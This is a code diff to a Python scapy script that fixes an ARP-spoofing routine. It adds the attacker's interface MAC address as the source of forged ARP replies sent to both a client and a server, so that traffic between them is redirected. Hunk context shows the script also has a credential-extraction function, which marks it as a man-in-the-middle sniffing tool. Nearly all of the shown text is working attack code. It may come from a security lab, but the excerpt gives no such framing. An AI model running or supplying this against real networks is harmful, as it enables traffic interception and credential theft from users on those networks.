@@ -17,6 +17,7 @@ from scapy.all import (
     RandIP,
     RandShort,
     AsyncSniffer,
+    get_if_hwaddr,
     getmacbyip,
     sendp,
     sniff,
@@ -63,6 +64,7 @@ def extract_credentials(payload):
 def run_arp(args):
     client_mac = getmacbyip(args.client)
     server_mac = getmacbyip(args.server)
+    attacker_mac = get_if_hwaddr(args.interface)
     if not client_mac or not server_mac:
         raise RuntimeError("Could not resolve Client/Server MAC address")
 
@@ -98,12 +100,26 @@ def run_arp(args):
     try:
         while running:
             sendp(
-                Ether(dst=client_mac) / ARP(op=2, pdst=args.client, hwdst=client_mac, psrc=args.server),
+                Ether(src=attacker_mac, dst=client_mac)
+                / ARP(
+                    op=2,
+                    hwsrc=attacker_mac,
+                    psrc=args.server,
+                    hwdst=client_mac,
+                    pdst=args.client,
+                ),
                 iface=args.interface,
                 verbose=False,
             )
             sendp(
-                Ether(dst=server_mac) / ARP(op=2, pdst=args.server, hwdst=server_mac, psrc=args.client),
+                Ether(src=attacker_mac, dst=server_mac)
+                / ARP(
+                    op=2,
+                    hwsrc=attacker_mac,
+                    psrc=args.client,
+                    hwdst=server_mac,
+                    pdst=args.server,
+                ),
                 iface=args.interface,
                 verbose=False,
             )
